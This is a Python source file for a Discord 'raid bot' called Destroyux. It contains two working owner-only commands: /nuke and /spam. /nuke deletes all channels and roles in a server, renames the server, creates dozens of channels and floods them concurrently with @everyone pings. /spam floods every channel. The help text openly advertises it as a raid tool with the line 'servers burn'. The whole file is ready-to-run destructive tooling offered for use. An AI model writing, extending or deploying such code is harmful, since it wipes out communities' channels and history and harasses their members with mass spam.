# main.py
import discord
from discord.ext import commands
import asyncio
import os
from dotenv import load_dotenv
from typing import Optional

load_dotenv()

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix=["!", "/"], intents=intents)

class DestroyuxBot(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
    
    # ===== NUKE COMMAND =====
    @commands.hybrid_command(name="nuke", description="Nuke server - delete channels, spam, customize")
    @commands.is_owner()
    async def nuke(self, ctx,
                   ping_count: int = 10,
                   new_channels: int = 50,
                   spam_count: int = 100,
                   server_name: Optional[str] = None,
                   message: Optional[str] = None):
        """
        /nuke [ping_count] [new_channels] [spam_count] [server_name] [message]
        !nuke 10 50 100 NUKED "DESTROYED"
        """
        
        if isinstance(ctx, commands.Context):
            await ctx.defer()
        else:
            await ctx.response.defer()
        
        guild = ctx.guild
        srv_name = server_name or "NUKED BY DESTROYUX"
        spam_msg = message or "DESTROYED BY DESTROYUX"
        ping_str = " ".join(["@everyone"] * ping_count)
        final_msg = f"{ping_str} {spam_msg}"
        
        # Concurrent deletion
        delete_tasks = []
        for channel in guild.channels:
            delete_tasks.append(self._safe_delete_fast(channel))
        
        for role in guild.roles:
            if role.name != "@everyone":
                delete_tasks.append(self._safe_delete_role_fast(role))
        
        results = await asyncio.gather(*delete_tasks, return_exceptions=True)
        deleted = sum(1 for r in results if r)
        
        # Change server name (fast)
        try:
            await guild.edit(name=srv_name)
        except:
            pass
        
        # Create channels (concurrent, max speed)
        create_tasks = []
        for i in range(new_channels):
            create_tasks.append(guild.create_text_channel(f"destroyed-{i}"))
        
        new_chans = await asyncio.gather(*create_tasks, return_exceptions=True)
        created = sum(1 for ch in new_chans if isinstance(ch, discord.TextChannel))
        
        # Spam all new channels (EXTREME SPEED)
        spam_tasks = []
        for channel in new_chans:
            if isinstance(channel, discord.TextChannel):
                for _ in range(spam_count):
                    spam_tasks.append(self._spam_fast(channel, final_msg))
        
        await asyncio.gather(*spam_tasks, return_exceptions=True)
        spam_sent = len(spam_tasks)
        
        reply = f"✓ NUKED: {deleted} deleted | {created} channels created | {spam_sent} messages spammed"
        
        if isinstance(ctx, commands.Context):
            await ctx.send(reply)
        else:
            await ctx.followup.send(reply)
    
    # ===== SPAM COMMAND =====
    @commands.hybrid_command(name="spam", description="Spam all channels with custom message")
    @commands.is_owner()
    async def spam(self, ctx,
                   count: int = 100,
                   ping_count: int = 5,
                   message: Optional[str] = None):
        """
        /spam [count] [ping_count] [message]
        !spam 100 5 "RAIDED"
        """
        
        if isinstance(ctx, commands.Context):
            await ctx.defer()
        else:
            await ctx.response.defer()
        
        guild = ctx.guild
        msg = message or "DESTROYED BY DESTROYUX"
        ping_str = " ".join(["@everyone"] * ping_count)
        final_msg = f"{ping_str} {msg}"
        
        channels = [ch for ch in guild.text_channels 
                   if ch.permissions_for(guild.me).send_messages]
        
        # EXTREME SPEED: Spam all channels concurrently
        spam_tasks = []
        for channel in channels:
            for _ in range(count):
                spam_tasks.append(self._spam_fast(channel, final_msg))
        
        results = await asyncio.gather(*spam_tasks, return_exceptions=True)
        total = sum(1 for r in results if r)
        
        reply = f"✓ SPAMMED: {total} messages across {len(channels)} channels"
        
        if isinstance(ctx, commands.Context):
            await ctx.send(reply)
        else:
            await ctx.followup.send(reply)
    
    # ===== HELP COMMAND =====
    @commands.hybrid_command(name="help", description="Show destroyux commands")
    async def help_cmd(self, ctx):
        """Display all available commands"""
        
        if isinstance(ctx, commands.Context):
            await ctx.defer()
        else:
            await ctx.response.defer()
        
        help_text = """
```
╔══════════════════════════════════════════════╗
║          DESTROYUX - RAID BOT               ║
║          Credit: m3oza                      ║
╚══════════════════════════════════════════════╝

/nuke [ping_count] [new_channels] [spam_count] [server_name] [message]
!nuke 10 50 100 NUKED "DESTROYED"

  • Delete ALL channels and roles
  • Spam @everyone (customizable pings)
  • Create unlimited new channels
  • Spam all channels with custom message
  • Customize server name
  
Examples:
  /nuke 20 100 200 "PWNED" "OWNED"
  !nuke 5 50 100

───────────────────────────────────────────────

/spam [count] [ping_count] [message]
!spam 100 5 "RAIDED"

  • Spam ALL channels
  • Customizable message
  • Customizable @everyone pings
  • Unlimited message count

Examples:
  /spam 500 10 "DESTROYED"
  !spam 200 20

───────────────────────────────────────────────

STATUS: servers burn | .gg/m3oza
SPEED: EXTREME (concurrent async operations)
```
        """
        
        if isinstance(ctx, commands.Context):
            await ctx.send(help_text)
        else:
            await ctx.followup.send(help_text)
    
    # Fast operations (no delays)
    async def _safe_delete_fast(self, channel):
        try:
            await channel.delete()
            return True
        except:
            return False
    
    async def _safe_delete_role_fast(self, role):
        try:
            await role.delete()
            return True
        except:
            return False
    
    async def _spam_fast(self, channel, message):
        try:
            await channel.send(message)
            return True
        except:
            return False

@bot.event
async def on_ready():
    print(f"[+] destroyux ONLINE as {bot.user}")
    try:
        synced = await bot.tree.sync()
        print(f"[+] Synced {len(synced)} slash commands")
    except Exception as e:
        print(f"[-] Sync error: {e}")
    
    # Watching status
    await bot.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name="servers burn | .gg/m3oza"
        )
    )

async def main():
    async with bot:
        await bot.add_cog(DestroyuxBot(bot))
        await bot.start(os.getenv("BOT_TOKEN"))

if __name__ == "__main__":
    asyncio.run(main())
